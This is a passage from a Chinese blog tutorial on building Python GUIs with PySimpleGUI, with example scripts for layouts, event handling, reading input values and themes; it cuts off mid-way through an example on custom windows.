            <a href="/2022/08/17/python%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91/" class="post-title-link" itemprop="url">python图形界面开发</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-01 12:40:00" itemprop="dateModified" datetime="2022-06-01T12:40:00+08:00">2022-06-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1第一个界面-py"><a href="#1第一个界面-py" class="headerlink" title="1第一个界面.py"></a>1第一个界面.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 导入库</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 定义布局，确定行数</span></span><br><span class="line">layout=[</span><br><span class="line">			[sg.Text(<span class="string">&#x27;请输入您的基本信息&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;姓名&#x27;</span>),sg.InputText(<span class="string">&#x27;xx&#x27;</span>,key=<span class="string">&#x27;name&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;性别&#x27;</span>),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;国籍&#x27;</span>),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Button(<span class="string">&#x27;确定&#x27;</span>),sg.Button(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建窗口</span></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 事件循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">	event,value=window.read() <span class="comment"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:  <span class="comment"># 窗口关闭事件</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> event==<span class="string">&#x27;确定&#x27;</span>:</span><br><span class="line">		<span class="built_in">print</span>(value[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">		<span class="built_in">print</span>(value[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭窗口</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="2窗口读取返回值–事件-py"><a href="#2窗口读取返回值–事件-py" class="headerlink" title="2窗口读取返回值–事件.py"></a>2窗口读取返回值–事件.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 窗口关闭事件</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	窗口关闭按钮是一个特殊的按钮，在界面的右上角X</span></span><br><span class="line"><span class="string">	编写方法：</span></span><br><span class="line"><span class="string">		if event==None:  # 窗口关闭事件</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">		if event==sg.WIN_CLOSED:  #窗口关闭事件</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意：定义窗口关闭事件是至关重要的，当你忘记定义窗口关闭事件，然后又点击了窗口右上角的X按钮，它会默默地消耗你100%的CPU</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 按钮点击事件</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	if event==&#x27;确认&#x27;:  # 判断事件是否发生</span></span><br><span class="line"><span class="string">		print(&#x27;确认&#x27;)  # 事件发生时要处理执行的任务</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;执行确认任务&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	if event==&#x27;取消&#x27;:  # 判断事件是否发生</span></span><br><span class="line"><span class="string">		print(&#x27;取消&#x27;)  # 事件发生时要处理执行的任务</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;执行取消任务&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3. 判断事件是否发生的几种方式</span></span><br><span class="line"><span class="string">	if event==&#x27;Exit&#x27;:</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;您点击了Exit&#x27;)</span></span><br><span class="line"><span class="string">		break</span></span><br><span class="line"><span class="string">	if event in (&#x27;Exit&#x27;, None):</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;您点击了Exit或窗口关闭按钮&#x27;)</span></span><br><span class="line"><span class="string">		break</span></span><br><span class="line"><span class="string">	if event.startswith(&#x27;确认&#x27;):</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;您点击了Exit**的按钮&#x27;)</span></span><br><span class="line"><span class="string">		break</span></span><br><span class="line"><span class="string">	if event.endswith(&#x27;确认&#x27;):</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;您点击了**Exit的按钮&#x27;)</span></span><br><span class="line"><span class="string">		break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4. 其他元素事件</span></span><br><span class="line"><span class="string">	像文本元素，输入框，下拉菜单等事件属性默认是关闭的。当手动设置他们的事件属性enable_events=True为真时，他们也将具有事件属性。</span></span><br><span class="line"><span class="string">	以文本元素举例</span></span><br><span class="line"><span class="string">	layout=[[sg.Text(&#x27;OK&#x27;,enable_events=True)]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	if event==&#x27;OK&#x27;:</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;文本元素OK的事件属性为真&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 导入库</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 定义布局，确定行数</span></span><br><span class="line">layout=[</span><br><span class="line">			[sg.Text(<span class="string">&#x27;请输入您的基本信息&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;姓名&#x27;</span>,enable_events=<span class="literal">True</span>),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;性别&#x27;</span>),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Text(<span class="string">&#x27;国籍&#x27;</span>),sg.InputText(<span class="string">&#x27;xx&#x27;</span>)],</span><br><span class="line">			[sg.Button(<span class="string">&#x27;确认&#x27;</span>),sg.Button(<span class="string">&#x27;取消&#x27;</span>)],</span><br><span class="line">			[sg.Button(<span class="string">&#x27;确认1&#x27;</span>),sg.Button(<span class="string">&#x27;1取消&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">		]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建窗口</span></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 事件循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">	event,value=window.read() <span class="comment"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:  <span class="comment"># 窗口关闭事件</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	if event in (&#x27;确认&#x27;,&#x27;取消&#x27;):</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;执行了确认或取消任务&#x27;)</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> event.startswith(<span class="string">&#x27;确认&#x27;</span>):</span><br><span class="line">		sg.Popup(<span class="string">&#x27;执行确认&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> event.endswith(<span class="string">&#x27;取消&#x27;</span>):</span><br><span class="line">		sg.Popup(<span class="string">&#x27;执行取消&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> event == <span class="string">&#x27;姓名&#x27;</span>:</span><br><span class="line">		sg.Popup(<span class="string">&#x27;这是个文本，点了也没用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	if event == &#x27;确认&#x27;:</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;执行了确认任务&#x27;)</span></span><br><span class="line"><span class="string">	if event == &#x27;取消&#x27;:</span></span><br><span class="line"><span class="string">		sg.Popup(&#x27;执行了取消任务&#x27;)</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 关闭窗口</span></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="3窗口读取返回值–值-py"><a href="#3窗口读取返回值–值-py" class="headerlink" title="3窗口读取返回值–值.py"></a>3窗口读取返回值–值.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">本节课的本目标有两个：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">一、通过列表索引获取返回值-值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">list=[1,2,3,4,5]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(list)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出结果为：[1, 2, 3, 4, 5]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(list[0])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出结果为：1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以上是我们之前学基础语法时，列表的一些知识点，我不多讲，哪么如何通过列有索引来获取窗口的返回值呢？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">方法一：获取界面全部的值 print(values)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">方法二：获取界面指定的值 print(values[0]) ,print(values[1])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">二、通过字典的键获取返回值-值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">界面默认的返回值是通过列表索引获得指定值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">但是当给元素设定唯一标识符key</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">则该元素无法通过列表索引</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">只能通过字典key进行索引。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(values[key])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">课程内演示所用代码如下：</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">[sg.Text(<span class="string">&#x27;请输入您的信息&#x27;</span>)],</span><br><span class="line">[sg.Text(<span class="string">&#x27;姓名&#x27;</span>),sg.InputText(<span class="string">&#x27;程序员无声&#x27;</span>,key=<span class="string">&#x27;name&#x27;</span>)],</span><br><span class="line">[sg.Text(<span class="string">&#x27;性别&#x27;</span>),sg.InputText(<span class="string">&#x27;男&#x27;</span>)],</span><br><span class="line">[sg.Text(<span class="string">&#x27;民族&#x27;</span>),sg.InputText(<span class="string">&#x27;汉&#x27;</span>)],</span><br><span class="line">[sg.Button(<span class="string">&#x27;确认&#x27;</span>),sg.Button(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python教程&#x27;</span>,layout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	event,values=window.read()</span><br><span class="line">	<span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> event == <span class="string">&#x27;确认&#x27;</span>:</span><br><span class="line">		<span class="built_in">print</span>(values[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">window.close() <span class="comment"># 作者：程序员无声 https://www.bilibili.com/read/cv15481976 出处：bilibili</span></span><br></pre></td></tr></table></figure>

<h1 id="4PySimpleGUI如何设定主题-py"><a href="#4PySimpleGUI如何设定主题-py" class="headerlink" title="4PySimpleGUI如何设定主题.py"></a>4PySimpleGUI如何设定主题.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">主题theme包括：窗口的背景颜色，文本Text颜色，按钮的字体颜色和按钮颜色等。</span></span><br><span class="line"><span class="string">一、如何直观查看有效主题？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">方法如下：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import PySimpleGUI as sg#导入库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sg.theme_previewer()#查看有效主题</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">二、如何获取有效主题？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import PySimpleGUI as sg#导入库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(sg.theme_list()) #获取主题名称列表，并打印出来</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">三、如何设定主题</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">设定方法：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sg.theme(&#x27;主题名称&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如何随机主题：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sg.theme(&#x27;&#x27;) 作者：程序员无声 https://www.bilibili.com/read/cv15497613?spm_id_from=333.999.0.0 出处：bilibili</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sg.theme_previewer() #查看有效主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sg.theme_list()) #获取主题名称列表，并打印出来</span></span><br><span class="line"></span><br><span class="line">sg.theme(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sg.Popup(<span class="string">&#x27;演示弹窗&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="5如何修改主题-py"><a href="#5如何修改主题-py" class="headerlink" title="5如何修改主题.py"></a>5如何修改主题.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">如何获取主题的部份设置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取方式：print(sg.theme_background_color())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">常用到的一些主题属性：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_background_color                 #主题_背景_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_border_width                         #主题_边框_宽度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_button_color                          #主题_按钮_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_element_background_color  #主题_元素_背景_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_element_text_color               #主题_元素_文本_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_input_background_color       #主题_输入框_背景_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_input_text_color                    #主题_输入框_文本_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_progress_bar_border_color#主题_进度_栏_边框_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_progress_bar_color              #主题_进度_栏_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_slider_border_width             #主题_滑块_边框_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_slider_color                          #主题_滑块_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_text_color                             #主题_文本_颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">theme_text_element_background_color#主题文本元素背景颜色</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如何修改主题的部份设置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import PySimpleGUI as sg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(sg.theme_list()) 作者：程序员无声 https://www.bilibili.com/read/cv15514934 出处：bilibili</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sg.theme_previewer() #查看有效主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sg.theme_list()) #获取主题名称列表，并打印出来</span></span><br><span class="line"></span><br><span class="line">sg.theme(<span class="string">&#x27;DarkPurple&#x27;</span>)</span><br><span class="line">sg.Popup(<span class="string">&#x27;演示弹窗&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sg.theme_background_color()</span></span><br><span class="line">sg.theme_button_color((<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;#472b62&#x27;</span>))</span><br><span class="line">sg.Popup(<span class="string">&#x27;演示弹窗&#x27;</span>,<span class="string">&#x27;按键字体变黑色&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="6如何自定义窗口-py"><a href="#6如何自定义窗口-py" class="headerlink" title="6如何自定义窗口.py"></a>6如何自定义窗口.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用for循环快速定义元素</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># for循环遍历字符串                  # for循环遍历列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a=&#x27;djfsdldkfj&#x27;                               a=[1,23,&#x27;A&#x27;,&#x27;程序员&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in a:                                     for i in a:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   print(i)                                         print(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以上是我们在学习基础语法时接触过for循环的一些使用方法，哪用它来定义元素要怎么做呢？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">layout=[[sg.In(i) for i in &#x27;ABCD&#x27;]]    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#用for循环遍历字符串的形式布局</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">layout=[[[sg.In(i)] for i in [&#x27;北京&#x27;,&#x27;上海&#x27;,&#x27;深圳&#x27;]]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#用for循环遍历列表的形式布局</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">布局和元素的另一种组合方式。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最常见的布局定义方式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">layout=[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;请输入基本信息&#x27;)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;姓名&#x27;),sg.In()],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;性别&#x27;),sg.In()],</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[sg.Text(&#x27;籍贯&#x27;),sg.In()],</span></span><br><span 